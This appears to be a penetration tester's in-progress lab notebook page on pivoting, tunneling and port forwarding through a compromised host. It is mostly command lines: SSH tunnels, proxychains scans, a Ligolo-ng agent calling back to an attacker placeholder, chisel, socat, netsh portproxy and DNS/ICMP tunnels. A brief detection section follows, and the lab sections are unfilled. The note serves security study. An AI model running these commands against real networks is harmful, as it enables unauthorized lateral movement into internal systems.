# Pivoting, Tunneling, and Port Forwarding

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Use a compromised host as a gateway to reach networks you can't touch directly. **Port forward** (one port), **tunnel/proxy** (route many through the pivot), **pivot** (chain through multiple hosts). (Quick one-liners also in `cheatsheets/pivoting.md`.)

## Recon on the pivot (find the next network)
```bash
ifconfig / ipconfig ; netstat -r         # extra NICs / routes = another subnet
netstat -antp ; arp -a                    # what the pivot can see
```

## SSH tunneling (no tools to upload if SSH creds exist)
```bash
ssh -L 1234:127.0.0.1:3306 user@pivot     # LOCAL: my :1234 → pivot's :3306
ssh -D 9050 user@pivot                    # DYNAMIC: SOCKS proxy on :9050 (use with proxychains)
ssh -R 8080:127.0.0.1:80 user@attacker    # REMOTE: pivot exposes a port back to me
```
`proxychains <tool>` routes any tool through the SOCKS proxy (set `socks5 127.0.0.1 9050` in `/etc/proxychains.conf`):
```bash
proxychains nmap -sT -Pn 172.16.5.1-50 ; proxychains crackmapexec smb 172.16.5.0/24
```

## Ligolo-ng (modern go-to — clean, no proxychains)
```bash
# attacker: make the tun interface + start proxy
sudo ip tuntap add user $USER mode tun ligolo ; sudo ip link set ligolo up
ligolo-proxy -selfcert
# on the compromised host:
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# back in ligolo: select session, then on attacker add the route:
sudo ip route add <TARGET_CIDR> dev ligolo    # then type `start` in ligolo
# now reach the internal net directly (nmap, CME, etc. — no proxychains needed)
```
Double pivot: second tun (`ligolo-double`) + `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601` on pivot 1, run a second agent on pivot 2, add its route.

## Other tools
```bash
# chisel (SOCKS over HTTP, great when only web ports are open)
./chisel server -p 1234 --socks5          # attacker
./chisel client <ATTACKER>:1234 socks     # pivot
# sshuttle (route a subnet through SSH, no proxychains)
sudo sshuttle -r user@pivot 172.16.5.0/24
# socat port forward
socat TCP4-LISTEN:8080,fork TCP4:<host>:80
# Windows netsh portproxy
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<pivot> connectport=3389 connectaddress=<target>
# Metasploit: autoroute + socks_proxy for session-based pivoting
# dnscat2 / ptunnel-ng — DNS/ICMP tunnels when TCP is blocked (stealthy, slow)
```

## Fix / detection
Network segmentation, egress filtering, no dual-homed hosts without controls, monitor for SOCKS/odd tunnels and DNS/ICMP anomalies.

> **Ligolo-ng is the modern favorite** — it gives you a real route to the internal net, so every tool works natively (no `proxychains` wrapping). Flow: recon the pivot's extra NIC → stand up ligolo (or SSH -D + proxychains) → add the route → attack the new subnet. Chisel/dnscat2 are the fallbacks when only web/DNS egress is allowed.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
